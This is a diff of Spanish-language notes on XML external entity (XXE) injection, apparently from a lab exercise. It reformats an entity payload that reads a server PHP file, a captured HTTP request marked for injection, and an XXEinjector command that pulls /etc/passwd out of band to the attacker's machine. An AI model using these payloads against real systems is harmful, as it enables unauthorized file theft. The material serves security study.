@@ -85,12 +85,12 @@ Nos permite engañar al backend tomando el contenido como raw:
 
 Ejemplo no aplicable:
 
-<!DOCTYPE email [
-  <!ENTITY begin "<![CDATA[">
-  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
-  <!ENTITY end "]]>">
-  <!ENTITY joined "&begin;&file;&end;">
-]>
+    <!DOCTYPE email [
+      <!ENTITY begin "<![CDATA[">
+      <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+      <!ENTITY end "]]>">
+      <!ENTITY joined "&begin;&file;&end;">
+    ]>
 
 Desde que se prohibió el joined como medio interno, nos vemos obligado a usarlo desde afuera:
 
@@ -166,30 +166,20 @@ cramos un xml en nuestro servidor:
 
 ##### Guardamos la request http que tenemos en burp a un archivo desde el inicio hasta la declaración del xml y agregamos xxeinject ej:
 
-POST /blind/submitDetails.php HTTP/1.1
-
-Host: 10.129.201.94
-
-Content-Length: 169
-
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
-
-Content-Type: text/plain;charset=UTF-8
-
-Accept: */*
-
-Origin: http://10.129.201.94
-
-Referer: http://10.129.201.94/blind/
-
-Accept-Encoding: gzip, deflate
-
-Accept-Language: en-US,en;q=0.9
-
-Connection: close
-
-        <?xml version="1.0" encoding="UTF-8"?>
-        XXEINJECT
+    POST /blind/submitDetails.php HTTP/1.1
+    Host: 10.129.201.94
+    Content-Length: 169
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+    Content-Type: text/plain;charset=UTF-8
+    Accept: */*
+    Origin: http://10.129.201.94
+    Referer: http://10.129.201.94/blind/
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9
+    Connection: close
+    
+            <?xml version="1.0" encoding="UTF-8"?>
+            XXEINJECT
 
 ##### luego corremos la herramienta con:
         ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
